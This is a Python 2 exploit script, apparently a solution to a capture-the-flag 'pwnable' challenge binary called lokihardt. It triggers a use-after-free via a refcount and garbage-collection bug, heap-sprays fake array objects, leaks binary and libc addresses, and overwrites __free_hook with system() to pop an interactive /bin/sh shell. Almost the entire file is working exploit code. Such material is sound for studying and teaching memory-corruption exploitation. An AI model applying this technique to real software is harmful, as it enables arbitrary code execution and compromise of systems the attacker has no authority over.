import subprocess
import sys
import struct
import time
import fcntl
import os
import signal
from nonblockingstream import nonblockingstream

def read_until(word):
    data = stream.readuntil(word,0.1)
    return data

def write_p(string):
    p.stdin.write(string + "\n")
    p.stdin.flush()

def allocate_fill(idx,string):
    read_until(">")
    write_p("1")
    write_p(str(idx))
    write_p(string)
    read_until("\n")

def allocate(idx):
    read_until(">")
    write_p("1")
    read_until("idx? ")
    write_p(str(idx))

def delete(idx):
    read_until(">")
    write_p("2")
    read_until("idx? ")
    write_p(str(idx))

def use(idx):
    read_until(">")
    write_p("3")
    read_until("idx? ")
    write_p(str(idx))

def garbage_collect():
    read_until(">")
    write_p("4")

def heapspray(string):
    read_until(">")
    write_p("5")
    write_p(string)

def _sleep():
    print "pid = " + str(p.pid)
    raw_input("Press a key to coninue...")
    return True

def read_nonblocking(string):
    fd = p.stdout.fileno()
    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
    time.sleep(0.25)
    try:
        read_until_test(string)
    except:
        fcntl.fcntl(fd, fcntl.F_SETFL, fl)
        return 1
    fcntl.fcntl(fd, fcntl.F_SETFL, fl)
    return 0


offset_incorrect = True
p=stream=None
sleep = False
while(offset_incorrect):
    try:
        if sleep:
            raw_input("press a key to end process")
            exit()
        if p is not None:
            p.kill()
        p = subprocess.Popen("/home/raw/Documents/pwnable/grotesque/lokihardt/lokihardt", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        if stream is not None:
            stream.close()
        stream = nonblockingstream(p.stdout)

        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))

        # delete non-existent refereneces to make the refcount = 0
        delete(13)

        # run garbage collection which will free the object because refcount = 0
        garbage_collect()

        # allocate some objects to overwrite
        for i in range(0,5):
            heapspray("B"*256+ "read" + "\x00" + "B"*11)

        # Use object 
        use(0)
        data = read_until(">")
        if data is None:
            continue
        elif "BBBB" in data:
            type_address = struct.unpack('<Q', data[0:8])[0]
            #print 'address ->' + hex(type_address)
        else:
            continue
        base_address = type_address - 0x1258
        g_buf_offset = 0x202040
        g_buf_address = base_address + g_buf_offset
        array_buffer_offset = 0x202080
        array_buffer_address = base_address + array_buffer_offset


        # STEP 1
        #print "[+] Step 1"
        # set ArrayBuffer[1] above g_buf for later infoleak of libc functions
        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", array_buffer_address+8)
        fake_array += struct.pack("<Q", 0x8) 
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00" + "B"*10)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        allobj_pointer_above_gbuf = g_buf_address-0x110
        p.stdin.write(struct.pack("<Q", allobj_pointer_above_gbuf))
        print "[+] alignment  1 correct"

        # STEP 2
        # now set ArrayBuffer[2] = "read"
        # allocate object again
        try:
            allocate_fill(0,"A"*(256+16))
        except:
            continue
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # Heap spray with fake array ArrayBuffer[2]
        fake_array = struct.pack("<Q", array_buffer_address+16) #*wdata
        fake_array += struct.pack("<Q", 0x5) # length
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00" + "B"*10)
        # Use overwritten object
        use(0)
        if read_until("data?") is None:
            continue
        p.stdin.write("read" + "\x00")
        print "[+] alignment 2 correct"

        # STEP 3
        #print "[+] Step 3"
        # set g_buf to ArrayBuffer[3] address
        # allocate initial object with random padding
        try:
            allocate_fill(0,"A"*(256+16))
        except:
            continue
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", g_buf_address)
        fake_array += struct.pack("<Q", 0x8) 
        for i in range(0,5):
            heapspray(fake_array*16+ "write" + "\x00" + "B"*10)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        p.stdin.write(struct.pack("<Q", array_buffer_address+16))
        print "[+] alignment 3 correct"


        # STEP 4
        # use ArrayBuffer[1] to infoleak libc addresses
        use(1)
        data = read_until(">")
        free_address = struct.unpack('<Q', data[0:8])[0]
        free_offset = 0x7c600
        freehook_offset = 0x3a77c8
        libc_base = free_address - free_offset
        system_offset = 0x41490
        system_address = libc_base + system_offset
        freehook_address = libc_base + freehook_offset
        print "system address ->" + hex(system_address)
        print "freehook address ->" + hex(freehook_address)

        # STEP 5
        # overwrite free GOT free entry with system address
        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))
        #try:
        #    allocate_fill(0,"A"*(256+16))
        #except:
        #    continue
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", freehook_address)
        fake_array += struct.pack("<Q", 0x8) 
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00" + "B"*10)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        p.stdin.write(struct.pack("<Q", system_address))
        print "[+] alignment  4 correct"

        # STEP 5
        # set theOBJ = /bin/sh and call gc to call system and get shell
        allocate_fill(0,"/bin/sh" +'\x00' + "A"*(256+16-8))
        # delete non-existen reference to get refcount = 0
        delete(13)
        # run garbace collection to get shell
        garbage_collect()

        print "[+] Here is your shell"
        while(True):
            data = stream.read()
            sys.stdout.write(data)
            p.stdin.write(raw_input() + '\n')

        #offset_incorrect = 0
    except:
            continue



